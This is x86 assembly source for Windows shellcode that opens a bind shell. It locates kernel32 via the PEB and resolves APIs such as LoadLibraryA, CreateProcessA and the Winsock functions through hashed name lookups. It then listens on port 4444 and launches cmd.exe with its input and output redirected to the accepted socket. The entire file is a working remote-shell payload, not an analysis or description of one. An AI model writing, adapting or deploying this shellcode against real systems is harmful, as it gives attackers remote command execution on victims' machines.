.Const
LoadLibraryAConst 			Equ 3A75C3C1H
CreateProcessAConst			Equ 26813AC1H
WaitForSingleObjectConst 	Equ 0C4679698H
WSAStartupConst 			Equ 0EBD1EDFEH
WSASocketAConst				Equ 0DD7C4481H
listenConst					Equ 9A761FF0H
connectConst				Equ 42C02958H
bindConst					Equ 080FF799H
acceptConst					Equ 0C9C4EFB7H
sendConst					Equ 074A5295H
recvConst 					Equ 06135F3AH

.Code
Assume Fs:Nothing

Shellcode:

GETDELTA:
	Jmp NEXT
PREV:
	Pop Ebx
	Jmp END_GETDELTA
NEXT:
	Call PREV
END_GETDELTA:
	Mov Eax, Ebx
	Mov Cx, (Offset END_GETDELTA - Offset MainShellcode)
	Neg Cx
	Add Ax, Cx
	Jmp Eax

;Inputs:
;-------
;Esi --> Kernelbase
;Ebx -->The ArrayOfAPIs
GetAPIs Proc

 Local AddressFunctions:DWord
 Local AddressOfNameOrdinals:DWord
 Local AddressNames:DWord
 Local NumberOfNames:DWord

Getting_PE_Header:
	Mov Edi, Esi 		;Kernel32 imagebase
	Mov Eax, [Esi].IMAGE_DOS_HEADER.e_lfanew
	Add Esi, Eax 		;Esi-->PE Header Edi-->MZ Header
Getting_Export_Table:
	Mov Eax, [Esi].IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[0].VirtualAddress
	Add Eax, Edi
	Mov Esi, Eax
Getting_Arrays:
	Mov Eax, [Esi].IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
	Add Eax, Edi
	Mov AddressFunctions, Eax ;the first array
	Mov Eax, [Esi].IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
	Add Eax, Edi
	Mov AddressOfNameOrdinals, Eax ;the second array
	Mov Eax, [Esi].IMAGE_EXPORT_DIRECTORY.AddressOfNames
	Add Eax, Edi
	Mov AddressNames, Eax 	;the third array
	Mov Eax, [Esi].IMAGE_EXPORT_DIRECTORY.NumberOfNames
	Mov NumberOfNames, Eax 	;the number of APIs
	Push Esi
	Mov Esi, AddressNames
	Xor Ecx, Ecx
GetTheAPIs:
	Lodsd
	Push Esi
	Lea Esi, [Eax + Edi] 	;RVA + imagebase = VA
	Xor Edx,Edx
	Xor Eax,Eax
Checksum_Calc:
	Lodsb
	Test Al, Al		;Avoid the null byte in Cmp Eax,0
	Jz CheckFunction
	IMul Eax, Edx
	Xor Edx,Eax
	Inc Edx
	Jmp Checksum_Calc
CheckFunction:
	Pop Esi
	Xor Eax, Eax 		;The index of this API
	Cmp Edx, LoadLibraryAConst
	Jz FoundAddress
	Inc Eax
	Cmp Edx, CreateProcessAConst
	Jz FoundAddress
	Inc Eax
	Cmp Edx, WaitForSingleObjectConst
	Jz FoundAddress
	Inc Eax
	Cmp Edx, WSAStartupConst
	Jz FoundAddress
	Inc Eax
	Cmp Edx, WSASocketAConst
	Jz FoundAddress
	Inc Eax
	Cmp Edx, listenConst
	Jz FoundAddress
	Inc Eax
	Cmp Edx, connectConst
	Jz FoundAddress
	Inc Eax
	Cmp Edx, bindConst
	Jz FoundAddress
	Inc Eax
	Cmp Edx, acceptConst
	Jz FoundAddress
	Inc Eax
	Cmp Edx, sendConst
	Jz FoundAddress
	Inc Eax
	Cmp Edx, recvConst
	Jz FoundAddress
	Xor Eax, Eax
	Inc Ecx
	Cmp Ecx, NumberOfNames
	Jz EndFunc
	Jmp GetTheAPIs
FoundAddress:
	Mov Edx, Esi 		;save it temporary in edx
	Pop Esi 			;Esi --> PE Header
	Push Ecx
	Push Eax 			;save the index of the API
	Mov Eax, AddressOfNameOrdinals
	Movzx Ecx, Word Ptr [Eax + Ecx * 2]
	Mov Eax, AddressFunctions
	Mov Eax, DWord Ptr [Eax + Ecx * 4]
	Add Eax, Edi
	Pop Ecx 			;Get The Index of the API
	Mov [Ebx + Ecx * 4], Eax
	Pop Ecx
	Inc Ecx
	Push Esi
	Mov Esi, Edx
	Jmp GetTheAPIs
EndFunc:
	Mov Esi, Edi
	Ret
GetAPIs EndP
MainShellcode Proc
	Local recv:DWord
	Local send:DWord
	Local accept:DWord
	Local bind:DWord
	Local connect:DWord
	Local listen:DWord
	Local WSASocketA:DWord
	Local WSAStartup:DWord
	Local WaitForSingleObject:DWord
	Local CreateProcessA:DWord
	Local LoadLibraryA:DWord
	Local DataOffset:DWord
	Local WSAStartupData:WSADATA
	Local socket:DWord
	Local sAddr:sockaddr_in
	Local Startup:STARTUPINFO
	Local ProcInfo:PROCESS_INFORMATION

	Add Bx, Offset DATA - Offset END_GETDELTA
	Mov DataOffset, Ebx
;-----------------------------------------
;Getting Kernel Imagebase
;-----------------------------------------
	Xor Ecx, Ecx
	Add Ecx, 30H
	Mov Eax, DWord Ptr Fs:[Ecx]
	Mov Eax, DWord Ptr [Eax + 0CH]
	Mov Ecx, DWord Ptr [Eax + 1CH]
	Mov Ecx, DWord Ptr [Ecx]
	Mov Esi, DWord Ptr [Ecx + 8H]

;-----------------------------------------
;Getting APIs
;-----------------------------------------
	Lea Ebx, LoadLibraryA
	Call GetAPIs
	Xor Eax, Eax
	Mov Ax, '23'
	Push Eax
	Push '_2SW'
	Push Esp
	Call LoadLibraryA
	Mov Esi, Eax
	Call GetAPIs

;-----------------------------------------
;Payload : Bind Shell
;-----------------------------------------
	Lea Eax, WSAStartupData
	Push Eax
	Push 190H
	Call WSAStartup				;call to WSAStartup to start the connections
	Xor Eax, Eax
	Push Eax					;Flags = 0
	Push Eax					;Group = 0
	Push Eax					;pWSAprotocol = NULL
	Push Eax					;Protocol = IPPROTO_IP
	Push SOCK_STREAM
	Push AF_INET
	Call WSASocketA				;Create our socket (your phone who will connect or listen to/from the client
	Mov Edi, Eax				;save it in Edi
	Xor Esi, Esi
	Mov Ebx, DataOffset
	Mov Cx, Word Ptr [Ebx]
	Mov sAddr.sin_port, Cx 		;Port Number
	Mov sAddr.sin_family, AF_INET
	Mov sAddr.sin_addr, Esi 	;INADDR_ANY
	Lea Eax, sAddr
	Push 10H
	Push Eax
	Push Edi
	Call bind
	Push 0
	Push Edi
	Call listen
	Push Esi
	Push Esi
	Push Edi
	Call accept
	Mov Edi, Eax
	Push Edi
	Xor Ecx, Ecx
	Mov Cl, SizeOf Startup
	Lea Edi, Startup
	Xor Eax, Eax
	Rep Stosb
	Mov Cl, SizeOf ProcInfo
	Lea Edi, ProcInfo
	Xor Eax, Eax
	Rep Stosb
	Pop Edi
	Mov Startup.hStdInput, Edi
	Mov Startup.hStdOutput, Edi
	Mov Startup.hStdError, Edi
	Mov Byte Ptr [Startup.cb], SizeOf Startup
	Mov Word Ptr [Startup.dwFlags], STARTF_USESTDHANDLES Or STARTF_USESHOWWINDOW
	Xor Eax, Eax
	Push Ax
	Mov Al, 'D'
	Push Eax
	Mov Ax, 'MC'
	Push Ax
	Mov Eax, Esp
	Lea Ecx, ProcInfo
	Lea Edx, Startup
	Push Ecx
	Push Edx
	Push Esi
	Push Esi
	Push Esi
	Push 1
	Push Esi
	Push Esi
	Push Eax
	Push Esi
	Call CreateProcessA
	Push INFINITE
	Push ProcInfo.hProcess
	Call WaitForSingleObject
	Ret
MainShellcode EndP
DATA:
	Port DW 5C11H 				;5C11H == 4444 (port 4444)

End Shellcode